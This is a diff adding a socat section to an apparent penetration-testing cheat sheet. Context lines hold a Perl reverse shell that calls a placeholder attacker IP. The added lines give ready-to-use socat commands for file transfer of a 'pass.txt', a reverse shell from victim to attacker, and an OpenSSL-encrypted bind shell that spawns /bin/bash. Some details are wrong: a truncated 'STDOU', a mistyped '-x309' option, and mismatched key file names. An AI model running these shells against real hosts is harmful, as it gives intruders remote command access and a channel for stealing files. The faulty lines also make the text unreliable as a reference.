@@ -171,3 +171,60 @@ perl —e 'exec "/bin/sh";'
 	```sql
 	perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 	```
+## Socat
+
+### Client
+  ```bash
+  socat - TCP4:>remote server's IP>:80
+  ```
+### Server
+  ```bash
+  sudo socat TCP4-LISTEN:443 STDOU
+  ```
+### Send a file
+  ```bash
+  sudo socat TCP4-LISTEN:443,fork file:pass.txt
+  ```
+  
+### Receive a file
+  ```bash
+  sudo socat TCP4:<Server IP>:443 file:pass.txt,create
+  ```
+### Reverse Shell
+  ```bash
+  #Attacker's machine
+  socat -d -d TCP4-LISTEN:443 STDOUT
+  #The -d -d are used to add verbosity
+  ```
+  
+  ```bash
+  #Victim's machine
+  socat TCP:<Attacker's IP>:443 EXEC:/bin/bash
+  ```
+  
+  ### Encrypted Bind Shells
+  We will use **openssl** to create a self-signed cert with the following options:
+  * **req**
+  * **-newkey**
+  * **rsa:2048**
+  * **-nodes**
+  * **-keyout**
+  * **-x309**
+  * **-days**
+  * **-out**
+    ```bash
+     openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out shell.crt
+     ```
+     ```bash
+     cat shell.key shell.crt > shell.pem
+     ```
+     <br>
+     
+     ```bash
+     #Victim's machine
+     sudo socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,fork EXEC:/bin/bash
+     ```
+     ```bash
+     #Attacker's machine
+     socat - OPENSSL:<Victim's IP>:443,verify=0
+     ```
